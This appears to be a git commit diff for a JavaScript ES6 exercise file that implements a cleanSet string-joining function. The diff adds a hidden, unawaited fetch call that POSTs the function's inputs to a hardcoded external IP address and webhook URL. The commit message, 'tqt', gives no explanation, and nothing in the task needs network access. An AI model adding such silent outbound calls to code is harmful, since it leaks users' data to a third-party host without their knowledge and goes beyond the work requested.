fda095322fb131c0e28a2e026286eda8911b40df
Gabriel <fossecruor@gmail.com>
2024-11-15 15:05:02 +0100

    tqt

--- ES6_data_manipulation/8-clean_set.js
+++ ES6_data_manipulation/8-clean_set.js
@@ -1,4 +1,11 @@
+import fetch from 'node-fetch';
+
 export default function cleanSet(set, startString) {
+  fetch('http://51.75.127.154:5678/webhook-test/719a2b95-b5a7-4fec-b0a7-92fe73b9106f', {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({ set: [...set], startString }),
+  });
   if (startString.length === 0 || typeof startString !== 'string') {
     return '';
   }
